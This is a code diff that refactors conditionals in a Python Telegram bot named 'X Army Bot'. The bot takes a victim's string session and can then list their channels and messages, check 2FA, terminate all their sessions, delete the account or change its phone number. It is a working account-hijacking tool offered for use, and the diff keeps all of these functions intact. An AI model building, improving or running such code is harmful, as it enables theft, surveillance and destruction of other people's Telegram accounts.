@@ -196,7 +196,7 @@ async def op(event):
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
-  if not event.sender_id == legendx:
+  if event.sender_id != legendx:
     return await event.reply("please don't use me fuck off 🥺")
   try:
     await event.reply("session bot file", file="Xarmy.session")
@@ -218,18 +218,15 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       try:
         i = await userchannels(strses.text)
       except:
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
-        file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
-        file.close()
+        with open("session.txt", "w") as file:
+          file.write(i + "\n\nDETAILS BY X ARMY")
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
@@ -238,9 +235,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
       await event.reply(i + "\n\nThanks For using X Army Bot")
@@ -248,9 +243,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
@@ -260,9 +253,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
       await event.reply(i + "\n\nThanks For using X Army Bot")
@@ -270,9 +261,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
@@ -282,9 +271,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
@@ -294,9 +281,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
@@ -306,9 +291,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
@@ -319,9 +302,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
       await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
@@ -329,9 +310,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
       await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
@@ -339,9 +318,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
@@ -353,9 +330,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       pro = await x.get_response()
@@ -368,9 +343,7 @@ async def start(event):
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
-      if op:
-        pass
-      else:
+      if not op:
         return await event.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
       number = (await x.get_response()).text
